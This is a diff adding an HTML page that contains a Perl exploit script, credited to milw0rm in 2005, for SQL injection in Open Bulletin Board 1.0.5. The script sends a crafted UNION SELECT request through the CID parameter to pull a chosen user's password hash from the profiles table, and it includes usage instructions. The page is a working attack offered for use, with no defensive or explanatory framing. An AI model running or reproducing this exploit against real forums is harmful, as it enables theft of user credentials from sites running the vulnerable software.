@@ -1,0 +1,38 @@
+<html>
+<head>
+<title>Open Bulletin Board <= 1.0.5 SQL Injection Exploit</title>
+<pre>
+#!/usr/bin/perl -w 
+  
+ # OpenBB sql injection 
+ # tested on Open Bulletin Board 1.0.5 with mysql 
+ # (c)oded by x97Rang 2005 RST/GHC 
+ # Gr33tz:  __blf, 1dt.w0lf 
+  
+ use IO::Socket; 
+  
+ if (@ARGV != 3) 
+ { 
+    print &quot;\nUsage: $0 [server] [path] [id]\n&quot;; 
+    print &quot;like $0 forum.mysite.com / 1\n&quot;; 
+    print &quot;If found nothing - forum NOT vulnerable\n\n&quot;; 
+    exit (); 
+ } 
+  
+ $server = $ARGV[0]; 
+ $path = $ARGV[1]; 
+ $id = $ARGV[2]; 
+  
+ $socket = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$server&quot;,  PeerPort =&gt; &quot;80&quot;); 
+ printf $socket (&quot;GET %sindex.php?CID=999+union+select+1,1,password,1,1,1,1,1,1,1,1,id,1+from+profiles+where+id=$id/* HTTP/1.0\nHost: %s\nAccept: */*\nConnection: close\n\n&quot;, 
+  $path,$server,$id); 
+  
+ while(&lt;$socket&gt;) 
+ { 
+     if (/\&gt;(\w{32})\&lt;/) { print &quot;$1\n&quot;; } 
+ }
+
+# milw0rm.com [2005-07-18]
+</pre>
+</html>
+
